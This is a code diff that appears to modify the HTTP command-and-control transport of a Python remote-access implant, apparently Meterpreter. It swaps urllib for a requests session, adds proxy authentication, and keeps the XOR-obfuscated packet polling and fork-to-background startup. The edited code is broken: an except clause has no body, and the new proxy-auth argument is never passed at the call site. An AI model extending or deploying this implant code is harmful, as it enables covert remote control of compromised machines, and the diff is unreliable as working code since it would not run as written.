@@ -13,6 +13,8 @@ import sys
 import threading
 import time
 import traceback
+import requests
+from requests.auth import HTTPProxyAuth
 
 try:
     import ctypes
@@ -62,7 +64,7 @@ DEBUGGING = False
 DEBUGGING_LOG_FILE_PATH = None
 TRY_TO_FORK = True
 HTTP_CONNECTION_URL = None
-HTTP_PROXY = None
+PROXY = None
 HTTP_USER_AGENT = None
 HTTP_COOKIE = None
 HTTP_HOST = None
@@ -1018,35 +1020,42 @@ class Transport(object):
         trans_group += self.tlv_pack_timeouts()
         return trans_group
 
+
+
 class HttpTransport(Transport):
-    def __init__(self, url, proxy=None, user_agent=None, http_host=None, http_referer=None, http_cookie=None):
+    def __init__(self, url, proxy=None, proxy_auth=None, user_agent=None, http_host=None, http_referer=None, http_cookie=None):
         super(HttpTransport, self).__init__()
-        opener_args = []
-        scheme = url.split(':', 1)[0]
-        if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2, 7, 9)) or sys.version_info >= (3, 4, 3)):
-            import ssl
-            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-            ssl_ctx.check_hostname = False
-            ssl_ctx.verify_mode = ssl.CERT_NONE
-            opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
-        if proxy:
-            opener_args.append(urllib.ProxyHandler({scheme: proxy}))
-            opener_args.append(urllib.ProxyBasicAuthHandler())
-        self.proxy = proxy
-        opener = urllib.build_opener(*opener_args)
-        opener.addheaders = []
-        if user_agent:
-            opener.addheaders.append(('User-Agent', user_agent))
-        if http_cookie:
-            opener.addheaders.append(('Cookie', http_cookie))
-        if http_referer:
-            opener.addheaders.append(('Referer', http_referer))
-        self.user_agent = user_agent
-        urllib.install_opener(opener)
+        
         self.url = url
-        self._http_request_headers = {'Content-Type': 'application/octet-stream'}
+        self.proxy = proxy
+        self.proxy_auth = proxy_auth
+        self.user_agent = user_agent
+        self.session = requests.Session()
+        
+        # Set up proxies if provided
+        if proxy:
+            self.session.proxies = {
+                'http': proxy,
+                'https': proxy
+            }
+
+        # Set up proxy authentication if provided
+        if proxy_auth:
+            self.session.auth = HTTPProxyAuth(*proxy_auth)  # proxy_auth should be (username, password)
+
+        # Add headers if provided
+        self.session.headers = {
+            'Content-Type': 'application/octet-stream'
+        }
+        if user_agent:
+            self.session.headers['User-Agent'] = user_agent
         if http_host:
-            self._http_request_headers['Host'] = http_host
+            self.session.headers['Host'] = http_host
+        if http_referer:
+            self.session.headers['Referer'] = http_referer
+        if http_cookie:
+            self.session.headers['Cookie'] = http_cookie
+
         self._first_packet = None
         self._empty_cnt = 0
 
@@ -1055,32 +1064,27 @@ class HttpTransport(Transport):
             packet = self._first_packet
             self._first_packet = None
             return packet
+
         packet = None
         xor_key = None
-        url_h = None
-        request = urllib.Request(self.url, None, self._http_request_headers)
-        urlopen_kwargs = {}
-        if sys.version_info > (2, 6):
-            urlopen_kwargs['timeout'] = self.communication_timeout
+
         try:
-            url_h = urllib.urlopen(request, **urlopen_kwargs)
-            if url_h.code == 200:
-                packet = url_h.read()
+            response = self.session.get(self.url, timeout=self.communication_timeout)
+            
+            if response.status_code == 200:
+                packet = response.content
                 if len(packet) < PACKET_HEADER_SIZE:
-                    packet = None  # looks corrupt
+                    packet = None
                 else:
                     xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
                     header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
                     pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF + PACKET_LENGTH_SIZE])[0] - 8
                     if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
-                        packet = None  # looks corrupt
-        except:
-            debug_traceback('[-] failure to receive packet from ' + self.url)
+                        packet = None
+        except requests.RequestException as e:
 
         if not packet:
-            if url_h and url_h.code == 200:
-                # server has nothing for us but this is fine so update the communication time and wait
-                self.communication_last = time.time()
+            self.communication_last = time.time()
             delay = 100 * self._empty_cnt
             self._empty_cnt += 1
             time.sleep(float(min(10000, delay)) / 1000)
@@ -1090,12 +1094,11 @@ class HttpTransport(Transport):
         return packet
 
     def _send_packet(self, packet):
-        request = urllib.Request(self.url, packet, self._http_request_headers)
-        urlopen_kwargs = {}
-        if sys.version_info > (2, 6):
-            urlopen_kwargs['timeout'] = self.communication_timeout
-        url_h = urllib.urlopen(request, **urlopen_kwargs)
-        response = url_h.read()
+        try:
+            response = self.session.post(self.url, data=packet, timeout=self.communication_timeout)
+            return response.content
+        except requests.RequestException as e:
+            return None
 
     def patch_uri_path(self, new_path):
         match = re.match(r'https?://[^/]+(/.*$)', self.url)
@@ -1105,7 +1108,7 @@ class HttpTransport(Transport):
         return True
 
     def tlv_pack_transport_group(self):
-        trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
+        trans_group = super(HttpTransport, self).tlv_pack_transport_group()
         if self.user_agent:
             trans_group += tlv_pack(TLV_TYPE_TRANS_UA, self.user_agent)
         if self.proxy:
@@ -1751,7 +1754,7 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
             pass
 
     if HTTP_CONNECTION_URL and has_urllib:
-        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
+        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=PROXY, user_agent=HTTP_USER_AGENT,
                 http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
     else:
         # PATCH-SETUP-STAGELESS-TCP-SOCKET #
